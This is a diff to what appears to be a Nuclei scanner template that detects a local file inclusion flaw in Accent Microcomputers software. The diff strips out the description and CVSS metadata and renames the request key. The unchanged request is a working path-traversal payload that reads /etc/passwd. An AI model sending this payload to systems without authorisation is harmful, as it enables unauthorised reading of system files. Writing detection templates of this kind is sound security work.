@@ -4,18 +4,12 @@ info:
   name: Accent Microcomputers LFI
   author: 0x_Akoko
   severity: high
-  description: A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.
   reference:
     - https://cxsecurity.com/issue/WLB-2018050036
     - http://www.accent.com.pl
   tags: microcomputers,accent,lfi
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
-    cvss-score: 8.6
-    cve-id:
-    cwe-id: CWE-22
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd"
@@ -30,5 +24,3 @@ requests:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/03/02
